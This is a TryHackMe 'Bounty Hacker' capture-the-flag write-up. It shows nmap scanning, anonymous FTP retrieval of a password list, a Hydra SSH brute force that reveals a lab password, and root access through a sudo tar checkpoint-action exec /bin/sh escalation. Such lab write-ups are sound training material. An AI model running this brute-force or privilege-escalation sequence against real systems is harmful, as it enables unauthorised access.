Bounty Hacker CTF
============

## This is a CTF on [Try hack me](https://tryhackme.com)

# Recon

## Nmap

~~~
sudo nmap -sS -sV 10.10.66.28 -Pn -v
[sudo] password for sloppy: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-31 21:38 GMT
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 21:38
Completed Parallel DNS resolution of 1 host. at 21:38, 0.01s elapsed
Initiating SYN Stealth Scan at 21:38
Scanning 10.10.66.28 [1000 ports]
Discovered open port 22/tcp on 10.10.66.28
Discovered open port 80/tcp on 10.10.66.28
Discovered open port 21/tcp on 10.10.66.28
Completed SYN Stealth Scan at 21:38, 3.91s elapsed (1000 total ports)
Initiating Service scan at 21:38
Scanning 3 services on 10.10.66.28
Completed Service scan at 21:38, 6.10s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.66.28.
Initiating NSE at 21:38
Completed NSE at 21:38, 0.09s elapsed
Initiating NSE at 21:38
Completed NSE at 21:38, 0.06s elapsed
Nmap scan report for 10.10.66.28
Host is up (0.019s latency).
Not shown: 967 filtered tcp ports (no-response)
PORT      STATE  SERVICE         VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp             vsftpd 3.0.3
22/tcp    open   ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http            Apache httpd 2.4.18 ((Ubuntu))
990/tcp   closed ftps
~~~

## SSH

~~~
hydra -l lin -P locks.txt 10.10.66.28 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-31 21:55:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.66.28:22/
[22][ssh] host: 10.10.66.28   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-31 21:55:12
~~~

## Gobuster

~~~
gobuster dir -u http://10.10.66.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php     
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.66.28
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2022/10/31 21:47:20 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.66.28/images/]
/server-status        (Status: 403) [Size: 276]
~~~

## FTP

~~~
ftp 10.10.66.28 
Connected to 10.10.66.28.
220 (vsFTPd 3.0.3)
Name (10.10.66.28:sloppy): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||29052|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> cp task.txt .
?Invalid command.
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**************************************************************************|    68      390.62 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (4.16 KiB/s)
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**************************************************************************|   418        6.03 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (4.86 KiB/s)
~~~

# Shell/Privilege Escalation

## SSH

~~~
ssh lin@10.10.66.28                 
The authenticity of host '10.10.66.28 (10.10.66.28)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.66.28' (ED25519) to the list of known hosts.
lin@10.10.66.28's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
~~~
~~~
simple check on GTFO bins we can see we can escalate to root with the following command
~~~
~~~
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# whoami
root

And we are ROOT
~~~

# Conclusion

~~~
Easy Box today!!!
~~~
